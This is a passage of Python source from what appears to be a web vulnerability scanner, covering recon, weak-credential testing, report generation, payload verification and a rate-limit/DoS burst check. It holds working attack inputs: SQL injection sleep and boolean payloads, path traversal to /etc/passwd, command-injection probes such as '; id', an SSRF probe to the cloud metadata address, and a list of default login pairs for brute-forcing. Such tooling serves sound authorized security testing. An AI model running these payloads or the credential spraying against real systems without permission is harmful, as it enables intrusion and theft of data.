            f"{url}{'&' if '?' in url else '?'}page=../../../etc/passwd",
            url.rstrip("/") + "/__y2s_nonexistent_path_12345__",
        ]
        for err_url in _error_tests:
            try:
                r_err = await client.get(err_url, timeout=8, follow_redirects=True)
                body_err = r_err.text
                for pattern, label in self._SENSITIVE_SIGNATURES:
                    if re.search(pattern, body_err, re.IGNORECASE):
                        findings.append({
                            "type":     "Error-Triggered Disclosure",
                            "severity": "HIGH",
                            "location": err_url,
                            "value":    label,
                            "detail":   (f"{label} leaked in error response — "
                                         "server reveals internal info on invalid input"),
                        })
                        break
            except Exception:
                continue

        # Dedup by (type, location, value)
        seen = set()
        deduped = []
        for f in findings:
            key = (f["type"], f["location"], f["value"][:30])
            if key not in seen:
                seen.add(key)
                deduped.append(f)

        return deduped

    # ── Main entry point ─────────────────────────────────────────────────────

    async def run(self, url: str) -> dict:
        """
        Runs all three tasks concurrently and returns combined results dict.
        """
        self.console.print(
            f"\n[bold cyan]  Recon + Info Disclosure — {url}[/bold cyan]"
        )
        self.console.print(
            f"[dim]  Tasks: param discovery ({len(self._PARAM_WORDLIST)} words) | "
            f"dir enum ({len(self._DIR_WORDLIST)} paths) | "
            f"info disclosure (headers, patterns, robots, source maps, debug)[/dim]\n"
        )

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=True, timeout=12
        ) as client:
            params_task    = self._discover_params(client, url)
            dirs_task      = self._enum_dirs(client, url)
            disclosure_task= self._info_disclosure(client, url)

            params_res, dirs_res, disc_res = await asyncio.gather(
                params_task, dirs_task, disclosure_task,
                return_exceptions=True,
            )

        if isinstance(params_res, Exception):    params_res  = {}
        if isinstance(dirs_res, Exception):      dirs_res    = []
        if isinstance(disc_res, Exception):      disc_res    = []

        return {
            "url":         url,
            "timestamp":   datetime.now().isoformat(),
            "parameters":  params_res,
            "directories": dirs_res,
            "disclosure":  disc_res,
        }

    # ── Rich display ─────────────────────────────────────────────────────────

    def display(self, result: dict):
        url = result.get("url", "")
        self.console.print(
            f"\n[bold cyan]══════ Recon Report ─ {url} ══════[/bold cyan]"
        )

        # ── Parameters ────────────────────────────────────────────────────────
        params = result.get("parameters", {})
        get_p  = params.get("get_params", [])
        pst_p  = params.get("post_params", [])
        js_p   = params.get("js_params", [])

        if get_p or pst_p or js_p:
            ptree = Tree("[bold yellow]  Parameters Discovered[/bold yellow]")
            if get_p:
                gb = ptree.add(f"[cyan]GET  ({len(get_p)} found)[/cyan]")
                for p in get_p:
                    gb.add(f"[green]{p['name']}[/green]  [dim]{p['signal']}[/dim]")
            if pst_p:
                pb = ptree.add(f"[cyan]POST ({len(pst_p)} found)[/cyan]")
                for p in pst_p:
                    pb.add(f"[green]{p['name']}[/green]  [dim]{p['signal']}[/dim]")
            if js_p:
                jb = ptree.add(f"[cyan]JS/HTML extracted ({len(js_p)} names)[/cyan]")
                jb.add(f"[dim]{', '.join(js_p[:40])}[/dim]")
            self.console.print(ptree)
        else:
            self.console.print("[dim]  No hidden parameters discovered.[/dim]")

        # ── Directories ───────────────────────────────────────────────────────
        dirs = result.get("directories", [])
        if dirs:
            dtree = Tree(f"[bold yellow]  Paths Found ({len(dirs)})[/bold yellow]")
            _sev_col = {"HIGH":"bold red","MEDIUM":"yellow","LOW":"dim","INFO":"dim"}
            for d in dirs[:60]:
                sc  = _sev_col.get(d["severity"], "white")
                lab = f"[{sc}][{d['status']}][/{sc}]  {d['path']}"
                if d["severity"] in ("HIGH", "MEDIUM"):
                    lab += f"  [{sc}]{d['severity']}[/{sc}]"
                if d["reason"]:
                    lab += f"  [dim]— {d['reason']}[/dim]"
                node = dtree.add(lab)
                if d["content_type"]:
                    node.add(f"[dim]Type : {d['content_type']}  Size: {d['size']}B[/dim]")
                if d["redirect"]:
                    node.add(f"[dim]→ {d['redirect']}[/dim]")
                if d["snippet"] and d["severity"] in ("HIGH", "MEDIUM"):
                    node.add(f"[dim]Preview: {d['snippet'][:80]}[/dim]")
            self.console.print(dtree)
        else:
            self.console.print("[dim]  No directories or files found.[/dim]")

        # ── Information Disclosure ────────────────────────────────────────────
        disc = result.get("disclosure", [])
        if disc:
            itree = Tree(
                f"[bold red]  Information Disclosure ({len(disc)} findings)[/bold red]"
            )
            _sev_col2 = {
                "CRITICAL": "bold red", "HIGH": "red",
                "MEDIUM":   "yellow",   "LOW":  "dim",
            }
            for d in disc:
                sc  = _sev_col2.get(d["severity"], "white")
                node = itree.add(
                    f"[{sc}][{d['severity']}] {d['type']}[/{sc}]"
                )
                node.add(f"[dim]Location : {d['location']}[/dim]")
                node.add(f"[dim]Value    : {d['value']}[/dim]")
                node.add(f"[dim]Detail   : {d['detail']}[/dim]")
            self.console.print(itree)
        else:
            self.console.print("[dim]  No information disclosure detected.[/dim]")

        # ── Summary ───────────────────────────────────────────────────────────
        total_params = (len(params.get("get_params", [])) +
                        len(params.get("post_params", [])))
        high_dirs    = sum(1 for d in dirs if d["severity"] == "HIGH")
        crit_disc    = sum(1 for d in disc if d["severity"] in ("CRITICAL", "HIGH"))

        self.console.print(
            f"\n[bold]  Summary[/bold]  "
            f"Params: [cyan]{total_params}[/cyan]  "
            f"Paths: [cyan]{len(dirs)}[/cyan] ([red]{high_dirs} sensitive[/red])  "
            f"Disclosure: [red]{crit_disc} HIGH/CRITICAL[/red] / "
            f"[yellow]{len(disc) - crit_disc} MEDIUM/LOW[/yellow]"
        )

    # ── Auto-save ─────────────────────────────────────────────────────────────

    def save(self, result: dict) -> Path:
        rd, _ = FileHandler.get_output_dirs()
        ts     = datetime.now().strftime("%Y%m%d_%H%M%S")
        path   = rd / f"recon_{ts}.json"
        with open(path, "w") as f:
            json.dump(result, f, indent=2, default=str)
        return path


# ══════════════════════════════════════════════════════════════════════════════
#  AUTH SCANNER  (session login + authenticated scanning)
# ══════════════════════════════════════════════════════════════════════════════
class AuthScanner:
    """
    Handles two tasks:
    1. Login with provided credentials → get session cookies.
    2. Weak credential testing on login forms with common passwords.
    """

    _COMMON_CREDS = [
        ("admin",    "admin"),     ("admin",    "password"),
        ("admin",    "admin123"),  ("admin",    "123456"),
        ("admin",    "letmein"),   ("admin",    ""),
        ("root",     "root"),      ("root",     "toor"),
        ("root",     "password"),  ("root",     ""),
        ("test",     "test"),      ("test",     "test123"),
        ("user",     "user"),      ("user",     "password"),
        ("guest",    "guest"),     ("guest",    ""),
        ("demo",     "demo"),      ("demo",     "password"),
        ("admin",    "admin@123"), ("admin",    "P@ssw0rd"),
        ("admin",    "qwerty"),    ("administrator","administrator"),
    ]

    def __init__(self, config: Config):
        self.config = config

    async def login(self, login_url: str, data: dict,
                    success_pattern: str = "") -> Optional[dict]:
        """
        POST credentials to login_url.
        Returns cookie dict on success, None on failure.
        """
        try:
            async with httpx.AsyncClient(
                headers=random_headers(), verify=False,
                follow_redirects=True
            ) as cl:
                r = await cl.post(login_url, data=data,
                                  timeout=self.config.vuln_timeout)
                body = r.text.lower()
                cookies = dict(cl.cookies)
                if success_pattern and success_pattern.lower() in body:
                    return cookies
                # Heuristic: if we got cookies and no "login failed" message
                fail_signs = ["invalid","incorrect","wrong","failed","error",
                              "unauthorized","denied","try again"]
                if cookies and not any(s in body for s in fail_signs):
                    return cookies
                # Redirect after POST = login success in many apps
                if r.status_code in (301, 302) and cookies:
                    return cookies
        except Exception:
            pass
        return None

    async def weak_cred_test(self, login_url: str,
                             user_field: str = "username",
                             pass_field: str = "password",
                             console = None) -> List[dict]:
        """
        Test login form with common weak credential pairs.
        Returns list of {username, password, cookies} for successful logins.
        Use only on systems you own or have permission to test.
        """
        found = []
        if console:
            console.print(f"[dim]  Testing {len(self._COMMON_CREDS)} credential pairs on {login_url}...[/dim]")

        async with httpx.AsyncClient(
            headers=random_headers(), verify=False,
            follow_redirects=True
        ) as cl:
            for username, password in self._COMMON_CREDS:
                try:
                    r = await cl.post(
                        login_url,
                        data={user_field: username, pass_field: password},
                        timeout=self.config.vuln_timeout
                    )
                    cookies = dict(cl.cookies)
                    body    = r.text.lower()
                    fail    = any(s in body for s in
                                  ["invalid","incorrect","wrong","failed","unauthorized"])
                    success = (
                        (r.status_code in (301, 302) and cookies) or
                        (cookies and not fail and any(
                            w in body for w in
                            ["dashboard","logout","welcome","profile","settings"]))
                    )
                    if success:
                        found.append({
                            "username": username,
                            "password": password,
                            "cookies":  cookies,
                        })
                        if console:
                            console.print(f"[bold red]  ✓ VALID CREDS: {username} / {password}[/bold red]")
                    await asyncio.sleep(self.config.req_delay or 0.3)
                except Exception:
                    continue
        return found




# ══════════════════════════════════════════════════════════════════════════════
#  HTML REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
class HTMLReportGenerator:
    """
    Generates a self-contained HTML report from scan results.
    Includes: severity chart, per-vuln details, PoC payloads, CVSS scores,
    remediation tips — all in a single file with embedded CSS/JS.
    """

    _SEV_COLOR = {
        "CRITICAL": "#ff3b30",
        "HIGH":     "#ff6b35",
        "MEDIUM":   "#ffcc00",
        "LOW":      "#34c759",
    }
    _ALL_FIELDS = [
        ('sqli_vulnerabilities',        'SQL Injection'),
        ('xss_vulnerabilities',         'XSS'),
        ('idor_vulnerabilities',        'IDOR'),
        ('csrf_vulnerabilities',        'CSRF'),
        ('rce_vulnerabilities',         'RCE'),
        ('lfi_vulnerabilities',         'LFI'),
        ('rfi_vulnerabilities',         'RFI'),
        ('ssrf_vulnerabilities',        'SSRF'),
        ('fileupload_vulnerabilities',  'File Upload'),
        ('secmisconf_vulnerabilities',  'Security Misconfiguration'),
        ('sdt_vulnerabilities',         'Subdomain Takeover'),
        ('openredirect_vulnerabilities','Open Redirect'),
        ('cors_vulnerabilities',        'CORS'),
        ('hostheader_vulnerabilities',  'Host Header Injection'),
        ('xxe_vulnerabilities',         'XXE'),
        ('dirlist_vulnerabilities',     'Directory Listing'),
        ('jwt_vulnerabilities',         'JWT Vulnerability'),
        ('graphql_vulnerabilities',     'GraphQL'),
        ('prototype_vulnerabilities',   'Prototype Pollution'),
        ('crlf_vulnerabilities',        'CRLF Injection'),
        ('deserial_vulnerabilities',    'Insecure Deserialization'),
        ('bizlogic_vulnerabilities',    'Business Logic'),
        ('race_vulnerabilities',        'Race Condition'),
        ('clickjacking_vulnerabilities','Clickjacking'),
        ('sensitive_vulnerabilities',   'Sensitive Data'),
        ('hpp_vulnerabilities',         'HTTP Parameter Pollution'),
        ('enum_vulnerabilities',        'Account Enumeration'),
        ('mfa_vulnerabilities',         '2FA/OTP Bypass'),
        ('smuggling_vulnerabilities',   'HTTP Smuggling'),
        ('ssti_vulns',                  'SSTI'),
        ('nosqli_vulns',                'NoSQL Injection'),
        ('massassign_vulns',            'Mass Assignment'),
        ('jwt_conf_vulns',              'JWT Algorithm Confusion'),
        ('cache_vulns',                 'Cache Poisoning'),
        ('websocket_vulns',             'WebSocket Injection'),
        ('path_trav_vulns',             'Path Traversal'),
        ('api_abuse_vulns',             'API Versioning Abuse'),
        ('bopla_vulns',                 'BOPLA'),
        ('ldap_vulns',                  'LDAP Injection'),
        ('xml_vulns',                   'XML Injection'),
        ('verb_vulns',                  'Verb Tampering'),
        ('shellshock_vulns',            'Shellshock'),
        ('log4shell_vulns',             'Log4Shell'),
        ('spring_vulns',                'Spring4Shell'),
        ('ssi_vulns',                   'SSI Injection'),
        ('csti_vulns',                  'CSTI'),
    ]

    @staticmethod
    def _esc(s: str) -> str:
        """HTML-escape a string."""
        return (s or "").replace('&','&amp;').replace('<','&lt;').replace('>','&gt;').replace('"','&quot;')

    @classmethod
    def generate(cls, results: list, output_path: str) -> str:
        """
        Generate HTML report for a list of ComprehensiveScanResult.
        Returns the output file path.
        """
        all_vulns = []
        for result in results:
            for attr, label in cls._ALL_FIELDS:
                for v in (getattr(result, attr, None) or []):
                    cvss = CVSSScorer.score(v)
                    all_vulns.append((result.url, label, v, cvss))

        sev_counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
        for _, _, v, _ in all_vulns:
            sev_counts[v.severity] = sev_counts.get(v.severity, 0) + 1

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        targets   = list({r.url for r in results})

        rows = ""
        for i, (scan_url, label, v, cvss) in enumerate(all_vulns, 1):
            color = cls._SEV_COLOR.get(v.severity, '#888')
            rows += f"""
            <tr>
              <td>{i}</td>
              <td><span class="badge" style="background:{color}">{cls._esc(v.severity)}</span></td>
              <td>{cls._esc(label)}</td>
              <td>{cls._esc(v.subtype or '')}</td>
              <td class="url-cell" title="{cls._esc(scan_url)}">{cls._esc(scan_url[:60])}{'...' if len(scan_url)>60 else ''}</td>
              <td>{cls._esc(', '.join(v.vulnerable_params))}</td>
              <td><code>{cls._esc(v.payload_used or '')}</code></td>
              <td>{cls._esc(v.evidence or '')}</td>
              <td><span class="cvss-score" title="{cls._esc(cvss['vector'])}">{cvss['score']} ({cvss['rating']})</span></td>
              <td>{cls._esc(v.impact or '')}</td>
            </tr>"""

        target_list = ''.join(f'<li><code>{cls._esc(t)}</code></li>' for t in targets)
        verdict_colors = {'VULNERABLE':'#ff3b30','SUSPICIOUS':'#ffcc00','SAFE':'#34c759','UNKNOWN':'#888'}

        summary_cards = ""
        for sev, count in sev_counts.items():
            color = cls._SEV_COLOR.get(sev, '#888')
            summary_cards += f'<div class="card" style="border-left:4px solid {color}"><div class="card-num" style="color:{color}">{count}</div><div class="card-label">{sev}</div></div>'

        result_verdicts = ""
        for r in results:
            vc = verdict_colors.get(r.overall_verdict.value, '#888')
            result_verdicts += f'<tr><td><code>{cls._esc(r.url)}</code></td><td><span class="badge" style="background:{vc}">{cls._esc(r.overall_verdict.value)}</span></td></tr>'

        html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Y2S Security Report — {cls._esc(timestamp)}</title>
<style>
  :root{{--bg:#0d0f14;--surface:#161a22;--border:#252b36;--text:#e2e8f0;--dim:#64748b;--accent:#00ff88;}}
  *{{box-sizing:border-box;margin:0;padding:0;}}
  body{{background:var(--bg);color:var(--text);font-family:'IBM Plex Mono',monospace,sans-serif;font-size:13px;line-height:1.6;}}
  header{{padding:32px 40px;border-bottom:1px solid var(--border);}}
  header h1{{color:var(--accent);font-size:22px;letter-spacing:2px;}}
  header p{{color:var(--dim);margin-top:4px;}}
  .container{{max-width:1400px;margin:0 auto;padding:24px 40px;}}
  .section{{margin-bottom:40px;}}
  h2{{color:var(--accent);font-size:14px;letter-spacing:1px;text-transform:uppercase;margin-bottom:16px;padding-bottom:8px;border-bottom:1px solid var(--border);}}
  .cards{{display:flex;gap:16px;flex-wrap:wrap;margin-bottom:24px;}}
  .card{{background:var(--surface);border-radius:8px;padding:20px 24px;min-width:130px;}}
  .card-num{{font-size:32px;font-weight:bold;}}
  .card-label{{color:var(--dim);font-size:11px;margin-top:4px;text-transform:uppercase;}}
  ul.targets{{list-style:none;padding:0;}}
  ul.targets li{{padding:4px 0;color:var(--dim);}}
  ul.targets li code{{color:var(--accent);}}
  table{{width:100%;border-collapse:collapse;background:var(--surface);border-radius:8px;overflow:hidden;}}
  thead th{{background:#1e2430;padding:10px 12px;text-align:left;color:var(--dim);font-size:11px;text-transform:uppercase;letter-spacing:1px;white-space:nowrap;}}
  tbody td{{padding:10px 12px;border-top:1px solid var(--border);vertical-align:top;}}
  tbody tr:hover{{background:#1a1f2a;}}
  .badge{{display:inline-block;padding:2px 8px;border-radius:4px;color:#000;font-weight:bold;font-size:11px;}}
  .cvss-score{{color:var(--accent);cursor:help;}}
  code{{background:#1e2430;padding:2px 6px;border-radius:3px;font-size:11px;color:#a5f3a5;word-break:break-all;}}
  .url-cell{{max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}}
  .verdict-table td, .verdict-table th{{padding:8px 12px;}}
  .no-vulns{{color:var(--accent);padding:20px;text-align:center;background:var(--surface);border-radius:8px;}}
  footer{{padding:24px 40px;border-top:1px solid var(--border);color:var(--dim);font-size:11px;}}
</style>
</head>
<body>
<header>
  <h1>⚡ Y2S SECURITY SCAN REPORT</h1>
  <p>Generated: {cls._esc(timestamp)} &nbsp;|&nbsp; Total findings: {len(all_vulns)} &nbsp;|&nbsp; Targets: {len(targets)}</p>
</header>
<div class="container">

  <div class="section">
    <h2>Summary</h2>
    <div class="cards">{summary_cards}</div>
  </div>

  <div class="section">
    <h2>Targets &amp; Verdicts</h2>
    <table class="verdict-table">
      <thead><tr><th>URL</th><th>Verdict</th></tr></thead>
      <tbody>{result_verdicts}</tbody>
    </table>
  </div>

  <div class="section">
    <h2>Findings ({len(all_vulns)})</h2>
    {'<p class="no-vulns">✔ No vulnerabilities found.</p>' if not all_vulns else f'''
    <table>
      <thead>
        <tr>
          <th>#</th><th>Severity</th><th>Type</th><th>Subtype</th>
          <th>URL</th><th>Parameter</th><th>PoC Payload</th>
          <th>Evidence</th><th>CVSS</th><th>Impact</th>
        </tr>
      </thead>
      <tbody>{rows}</tbody>
    </table>'''}
  </div>

  <div class="section">
    <h2>Scanned Targets</h2>
    <ul class="targets">{target_list}</ul>
  </div>

</div>
<footer>Y2S Security Scanner — For authorized testing only. Verify all findings manually.</footer>
</body>
</html>"""

        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(html)
        return output_path



# ══════════════════════════════════════════════════════════════════════════════
#  VULNERABILITY VERIFIER — 3-tier FP reduction
# ══════════════════════════════════════════════════════════════════════════════
class VulnVerifier:
    """
    Three-tier PoC confirmation per finding:
    Tier 1 — Error signature (must not appear in baseline)
    Tier 2 — Boolean differential (true vs false condition)
    Tier 3 — Time-based canary (SLEEP vs no SLEEP)
    Finding confirmed if ≥1 tier passes.
    """
    def __init__(self, config):
        self.config = config

    async def verify_sqli(self, client, url, param, payload, all_params):
        results = {"passed": 0, "total": 3, "tiers": {}}
        parsed = urllib.parse.urlparse(url)
        def mk(p, v):
            tp = all_params.copy(); tp[p] = [v]
            tq = urllib.parse.urlencode(tp, doseq=True)
            return urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,tq,parsed.fragment))
        try:
            baseline = await client.get(mk(param, all_params.get(param,["1"])[0]), timeout=self.config.vuln_timeout)
            sql_errors = [r"you have an error in your sql",r"ORA-\d{5}",r"postgresql.*error",
                          r"microsoft.*sql.*server",r"sqlite.*exception",r"syntax error.*near"]
            body = (await client.get(mk(param, payload), timeout=self.config.vuln_timeout)).text.lower()
            t1 = any(re.search(e,body,re.IGNORECASE) and not re.search(e,baseline.text.lower(),re.IGNORECASE) for e in sql_errors)
            results["tiers"]["error_sig"] = t1
            if t1: results["passed"] += 1

            r_t = await client.get(mk(param,"' AND 1=1--"), timeout=self.config.vuln_timeout)
            r_f = await client.get(mk(param,"' AND 1=2--"), timeout=self.config.vuln_timeout)
            diff = abs(len(r_t.text)-len(r_f.text))
            t2 = diff > 80 and diff/max(len(r_t.text),len(r_f.text),1) > 0.05
            results["tiers"]["bool_diff"] = t2
            if t2: results["passed"] += 1

            t0 = time.monotonic()
            await client.get(mk(param,"' AND SLEEP(3)--"), timeout=12)
            elapsed = time.monotonic()-t0
            t0b = time.monotonic()
            await client.get(mk(param,"' AND SLEEP(0)--"), timeout=8)
            fast = time.monotonic()-t0b
            t3 = elapsed >= 2.5 and elapsed > fast*2.0
            results["tiers"]["time_based"] = t3
            if t3: results["passed"] += 1
        except Exception:
            pass
        results["is_fp"] = results["passed"] < 1
        results["confidence"] = ["LOW","MEDIUM","HIGH"][min(results["passed"],2)]
        return results

    async def verify_xss(self, client, url, param, payload, all_params):
        results = {"passed": 0, "total": 3, "tiers": {}}
        parsed = urllib.parse.urlparse(url)
        marker = f"y2sXSS{uuid.uuid4().hex[:8]}"
        def mk(p, v):
            tp = all_params.copy(); tp[p] = [v]
            tq = urllib.parse.urlencode(tp, doseq=True)
            return urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,tq,parsed.fragment))
        try:
            r1 = await client.get(mk(param,f"<{marker}>"), timeout=self.config.vuln_timeout)
            t1 = f"<{marker}>" in r1.text
            results["tiers"]["unescaped"] = t1
            if t1: results["passed"] += 1

            r2 = await client.get(mk(param,f'"{marker}'), timeout=self.config.vuln_timeout)
            t2 = marker in r2.text
            results["tiers"]["context"] = t2
            if t2: results["passed"] += 1

            r3 = await client.get(mk(param,f"<script>/*{marker}*/</script>"), timeout=self.config.vuln_timeout)
            csp = r3.headers.get("content-security-policy","")
            t3 = marker in r3.text and ("script-src" not in csp or "'unsafe-inline'" in csp)
            results["tiers"]["no_csp"] = t3
            if t3: results["passed"] += 1
        except Exception:
            pass
        results["is_fp"] = results["passed"] < 1
        results["confidence"] = ["LOW","MEDIUM","HIGH"][min(results["passed"],2)]
        return results

    async def verify_lfi(self, client, url, param, payload, all_params):
        results = {"passed": 0, "total": 3, "tiers": {}}
        parsed = urllib.parse.urlparse(url)
        sigs = [r"root:x:0:0:",r"\[boot loader\]",r"\[extensions\]",r"daemon:x:",r"DOCUMENT_ROOT"]
        def mk(p, v):
            tp = all_params.copy(); tp[p] = [v]
            tq = urllib.parse.urlencode(tp, doseq=True)
            return urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,tq,parsed.fragment))
        try:
            for lfi_pay in ["../../../../etc/passwd","..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                             "../../../../etc/passwd%00.jpg"]:
                r = await client.get(mk(param,lfi_pay), timeout=self.config.vuln_timeout)
                for sig in sigs:
                    if re.search(sig, r.text, re.IGNORECASE):
                        results["passed"] += 1
                        results["tiers"][f"sig_{lfi_pay[:15]}"] = True
                        break
                if results["passed"] >= 2:
                    break
        except Exception:
            pass
        results["is_fp"] = results["passed"] < 1
        results["confidence"] = ["LOW","MEDIUM","HIGH"][min(results["passed"],2)]
        return results

    async def verify_rce(self, client, url, param, payload, all_params):
        results = {"passed": 0, "total": 3, "tiers": {}}
        parsed = urllib.parse.urlparse(url)
        marker = f"RCEY2S{uuid.uuid4().hex[:8]}"
        def mk(p, v):
            tp = all_params.copy(); tp[p] = [v]
            tq = urllib.parse.urlencode(tp, doseq=True)
            return urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,tq,parsed.fragment))
        try:
            for rce_pl in [f"; echo {marker}",f"| echo {marker}",f"&& echo {marker}",f"`echo {marker}`"]:
                r = await client.get(mk(param,rce_pl), timeout=self.config.vuln_timeout)
                if marker in r.text:
                    results["passed"] += 1
                    results["tiers"][f"echo_{rce_pl[:10]}"] = True
            r_id = await client.get(mk(param,"; id"), timeout=self.config.vuln_timeout)
            if re.search(r"uid=\d+", r_id.text):
                results["passed"] += 1
                results["tiers"]["id_cmd"] = True
        except Exception:
            pass
        results["is_fp"] = results["passed"] < 1
        results["confidence"] = ["LOW","MEDIUM","HIGH"][min(results["passed"],2)]
        return results

    async def verify_ssrf(self, client, url, param, payload, all_params):
        results = {"passed": 0, "total": 2, "tiers": {}}
        parsed = urllib.parse.urlparse(url)
        def mk(p, v):
            tp = all_params.copy(); tp[p] = [v]
            tq = urllib.parse.urlencode(tp, doseq=True)
            return urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,tq,parsed.fragment))
        try:
            r1 = await client.get(mk(param,"http://169.254.169.254/latest/meta-data/"), timeout=8)
            t1 = any(k in r1.text.lower() for k in ["ami-id","instance-id","iam","local-ipv4"])
            results["tiers"]["aws_meta"] = t1
            if t1: results["passed"] += 1

            r_int = await client.get(mk(param,"http://127.0.0.1/"), timeout=6)
            r_ext = await client.get(mk(param,"http://example.com/"), timeout=6)
            t2 = r_int.status_code != r_ext.status_code or abs(len(r_int.text)-len(r_ext.text)) > 200
            results["tiers"]["internal_vs_ext"] = t2
            if t2: results["passed"] += 1
        except Exception:
            pass
        results["is_fp"] = results["passed"] < 1
        results["confidence"] = ["LOW","MEDIUM","HIGH"][min(results["passed"],2)]
        return results

    async def verify(self, vuln_type, client, url, param, payload, all_params):
        dispatch = {
            "SQLI": self.verify_sqli, "XSS": self.verify_xss,
            "LFI":  self.verify_lfi,  "RCE": self.verify_rce,
            "SSRF": self.verify_ssrf,
        }
        fn = dispatch.get(str(vuln_type).upper().split(".")[-1])
        if fn:
            return await fn(client, url, param, payload, all_params)
        return {"passed":1,"total":1,"is_fp":False,"confidence":"MEDIUM","tiers":{}}


# ══════════════════════════════════════════════════════════════════════════════
#  RATE LIMIT & DoS SAFETY CHECKER
# ══════════════════════════════════════════════════════════════════════════════
class RateLimitDoSChecker:
    """
    1. rate_limit: 20-req burst, detect 429/503 or RL headers.
    2. dos_protection: 50-req burst, verify site still responds.
    Non-destructive — purpose is to CONFIRM target has protection, not to attack.
    """
    def __init__(self, config, console):
        self.config  = config
        self.console = console

    async def check_rate_limiting(self, url):
        result = {"has_rate_limit":False,"rate_limit_header":"","triggered_at":None,"status_codes":[],"details":""}
        self.console.print("[dim]  Testing rate limiting (20 req)...[/dim]")
        statuses = []; rl_headers = []
        async with httpx.AsyncClient(headers=random_headers(),verify=False,follow_redirects=True,timeout=8) as cl:
            for i in range(20):
                try:
                    r = await cl.get(url)
                    statuses.append(r.status_code)
                    for h in ["x-ratelimit-limit","x-ratelimit-remaining","retry-after","x-rate-limit","ratelimit-limit"]:
                        if h in {k.lower() for k in r.headers}:
                            rl_headers.append(h)
                    if r.status_code in (429,503):
                        result["has_rate_limit"] = True
                        result["triggered_at"]   = i+1
                        break
                except Exception:
                    pass
                await asyncio.sleep(0.05)
        result["status_codes"]      = statuses
        result["rate_limit_header"] = ", ".join(set(rl_headers))
        if not result["has_rate_limit"] and rl_headers:
            result["has_rate_limit"] = True
            result["details"] = f"RL headers present: {result['rate_limit_header']}"
        elif not result["has_rate_limit"]:
            result["details"] = "No rate limiting — 20 rapid requests all succeeded"
        return result

    async def check_dos_protection(self, url):
        result = {"protected":False,"recovery_time":None,"burst_responses":[],"post_burst_status":None,"details":""}
        self.console.print("[dim]  Testing DoS protection (50-req burst)...[/dim]")
        async with httpx.AsyncClient(headers=random_headers(),verify=False,follow_redirects=False,timeout=5) as cl:
            tasks = [cl.get(url,timeout=4) for _ in range(50)]
            burst = await asyncio.gather(*tasks, return_exceptions=True)
            statuses = [r.status_code if isinstance(r,httpx.Response) else 0 for r in burst]
            result["burst_responses"] = statuses
            prot_count = sum(1 for s in statuses if s in (429,503,520,521,522,523,524))
            result["protected"] = prot_count >= 5
            await asyncio.sleep(2)
            try:
                r_check = await cl.get(url,timeout=8)
                result["post_burst_status"] = r_check.status_code
            except Exception:
                result["post_burst_status"] = 0
        ok = sum(1 for s in statuses if 200<=s<300)
        result["details"] = (
            f"DoS protection active — {prot_count}/50 requests blocked (429/503)."
            if result["protected"] else
            f"No DoS protection — {ok}/50 requests succeeded without blocking."
        )
        return result

    async def check_all(self, url):
        rl  = await self.check_rate_limiting(url)
        dos = await self.check_dos_protection(url)
        return {"rate_limit":rl,"dos_protection":dos}


# ══════════════════════════════════════════════════════════════════════════════
#  HACKERONE-READY REPORT GENERATOR
# ══════════════════════════════════════════════════════════════════════════════
class HackerOneReportGenerator:
    """
    Generates submission-ready bug report markdown.
    Compatible with HackerOne, Bugcrowd, Intigriti formats.
    Includes: CVSS, PoC cURL, Steps to Reproduce, Impact, Remediation, CWE.
    """
    _H1_SEV = {"CRITICAL":"critical","HIGH":"high","MEDIUM":"medium","LOW":"low","INFO":"informational"}
    _REMEDIATION = {
        "SQL Injection":     "Use parameterized queries. Never concatenate user input into SQL.",
        "Cross-Site Scripting":"HTML-encode all user output. Implement Content-Security-Policy.",
        "Remote Code Execution":"Never pass user input to system calls. Use allowlists.",
        "Local File Inclusion":"Validate paths against strict allowlist. Disable allow_url_include.",
        "Server-Side Request Forgery":"Allowlist URL destinations. Block RFC-1918 ranges.",
        "IDOR":              "Implement server-side authorization checks for every resource.",
        "CSRF":              "Use synchronizer tokens. Set SameSite=Strict on cookies.",
        "Open Redirect":     "Validate redirect URLs against strict allowlist.",
        "CORS":              "Validate Origin header against strict allowlist.",
        "Default":           "Apply input validation, output encoding, and access controls.",
    }
    _CWE = {
        "SQL Injection":"CWE-89","Cross-Site Scripting":"CWE-79",
        "Remote Code Execution":"CWE-94","Local File Inclusion":"CWE-98",
        "Server-Side Request Forgery":"CWE-918","IDOR":"CWE-639",
        "CSRF":"CWE-352","Open Redirect":"CWE-601","CORS":"CWE-942",
        "Path Traversal":"CWE-22","Subdomain Takeover":"CWE-350",
        "Insecure Deserialization":"CWE-502","Default":"CWE-693",
    }

    @classmethod
    def _remedy(cls, vt):
        for k,v in cls._REMEDIATION.items():
            if k.lower() in vt.lower(): return v
        return cls._REMEDIATION["Default"]

    @classmethod
    def _cwe(cls, vt):
        for k,v in cls._CWE.items():
            if k.lower() in vt.lower(): return v
        return cls._CWE["Default"]

    @classmethod
    def generate_report(cls, vuln, target_url, program_name="TARGET_PROGRAM"):
        sev   = vuln.severity.upper()
        h1sev = cls._H1_SEV.get(sev,"medium")
        cvss  = CVSSScorer.score(vuln)
        remedy= cls._remedy(vuln.vulnerability_type.value)
        cwe   = cls._cwe(vuln.vulnerability_type.value)
        ts    = datetime.now().strftime("%Y-%m-%d")
        param = ", ".join(vuln.vulnerable_params) if vuln.vulnerable_params else "N/A"
        parsed= urllib.parse.urlparse(vuln.url)
        qs    = dict(urllib.parse.parse_qsl(parsed.query))
        p0    = vuln.vulnerable_params[0] if vuln.vulnerable_params else "param"
        if p0 in qs:
            qs[p0] = vuln.payload_used or ""
            poc_url = urllib.parse.urlunparse((parsed.scheme,parsed.netloc,parsed.path,parsed.params,urllib.parse.urlencode(qs),parsed.fragment))
            curl_cmd = f'curl -ik "{poc_url}"'
        else:
